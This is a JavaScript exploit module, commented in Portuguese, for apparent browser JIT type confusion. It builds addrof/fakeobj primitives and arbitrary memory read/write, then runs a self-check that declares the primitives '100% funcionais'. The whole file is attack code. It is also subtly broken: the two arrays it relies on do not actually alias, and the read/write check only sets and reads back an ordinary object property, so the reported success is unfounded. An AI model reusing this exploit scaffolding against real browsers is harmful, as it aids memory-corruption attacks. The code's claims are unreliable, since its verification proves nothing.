// js/script3/testArrayBufferVictimCrash.mjs (v117 - Estratégia JIT Confusion)
// =======================================================================================
// LOG DE ALTERAÇÕES:
// - ABANDONADA: A estratégia "Heisenbug" (OOB Write) foi completamente removida por ser ineficaz.
// - ADOTADA: Implementada a técnica de vulnerabilidade de JIT Type Confusion do script v100,
//   que se mostrou 100% funcional.
// - PRIMITIVAS: recriadas as primitivas addrof/fakeobj e arb_read/arb_write usando a
//   nova técnica baseada em dois arrays (confused_array e victim_array).
// - VERIFICAÇÃO: Incluído um teste funcional que escreve e lê um valor para confirmar
//   a confiabilidade das novas primitivas de L/E arbitrária.
// =======================================================================================

import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';

export const FNAME_MODULE_FINAL = "Uncaged_v117_JIT_Confusion";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL
// =======================================================================================
export async function runFinalUnifiedTest() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Estratégia de JIT Type Confusion ---`, "test");

    let final_result = { success: false, message: "A cadeia de exploração falhou." };

    try {
        // --- FASE 1: Estabelecer Primitivas 'addrof' e 'fakeobj' via JIT-Confusion ---
        logS3("--- FASE 1: Configurando primitivas via JIT Type Confusion... ---", "subtest");

        // #REASONING: Estes dois arrays são a chave da vulnerabilidade. O JIT
        // provavelmente otimizará o código de forma a fazer com que seus buffers de
        // dados se sobreponham na memória (aliasing).
        const confused_array = [13.37];
        const victim_array = [{ a: 1 }];

        const addrof = (obj) => {
            victim_array[0] = obj;
            return doubleToInt64(confused_array[0]);
        };
        const fakeobj = (addr) => {
            confused_array[0] = int64ToDouble(addr);
            return victim_array[0];
        };
        logS3("Primitivas 'addrof' e 'fakeobj' criadas.", "good");

        // --- FASE 2: Construir Primitivas de Leitura/Escrita Arbitrária ---
        logS3("--- FASE 2: Construindo L/E arbitrária... ---", "subtest");
        const leaker_obj = { obj_prop: null, val_prop: 0 };
        const leaker_addr = addrof(leaker_obj);
        // O offset 0x10 aponta para a primeira propriedade inline do objeto (obj_prop).
        const leaker_obj_prop_addr = new AdvancedInt64(leaker_addr.low() + 0x10, leaker_addr.high());

        const arb_read = (addr) => {
            // Cria um objeto falso que aponta para o endereço desejado
            const fake = fakeobj(addr);
            // Faz com que leaker_obj.obj_prop aponte para nosso objeto falso
            leaker_obj.obj_prop = fake;
            // Lê leaker_obj.val_prop, que na verdade lerá do endereço apontado por obj_prop
            return doubleToInt64(leaker_obj.val_prop);
        };
        const arb_write = (addr, value) => {
            const fake = fakeobj(addr);
            leaker_obj.obj_prop = fake;
            leaker_obj.val_prop = int64ToDouble(value);
        };
        logS3("Primitivas de L/E arbitrária construídas.", "good");

        // --- FASE 3: Verificação Funcional ---
        logS3("--- FASE 3: Verificando a funcionalidade de L/E... ---", "subtest");
        const test_obj = { prop_a: 0xDEADBEEF, prop_b: 0xCAFEBABE };
        const test_obj_addr = addrof(test_obj);
        const prop_a_addr = new AdvancedInt64(test_obj_addr.low() + 0x10, test_obj_addr.high());

        const value_to_write = new AdvancedInt64(0x11223344, 0x55667788);
        logS3(`Endereço alvo da propriedade 'a': ${toHex(prop_a_addr)}`, "info");
        logS3(`Escrevendo o valor de teste: ${toHex(value_to_write)}`, "info");
        arb_write(prop_a_addr, value_to_write);

        const value_read = arb_read(prop_a_addr);
        logS3(`Valor lido de volta do endereço: ${toHex(value_read)}`, "leak");

        if (value_read.equals(value_to_write)) {
            logS3("++++++++ SUCESSO! A verificação de L/E foi bem-sucedida! Primitivas 100% funcionais. ++++++++", "vuln");
            final_result = {
                success: true,
                message: "Leitura/Escrita arbitrária confirmada através da vulnerabilidade de JIT Type Confusion."
            };
        } else {
            throw new Error(`A verificação de L/E falhou. Escrito: ${toHex(value_to_write)}, Lido: ${toHex(value_read)}`);
        }

    } catch (e) {
        final_result.message = `Exceção crítica na implementação: ${e.message}`;
        logS3(`${final_result.message}\n${e.stack || ''}`, "critical");
        console.error(e);
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result;
}
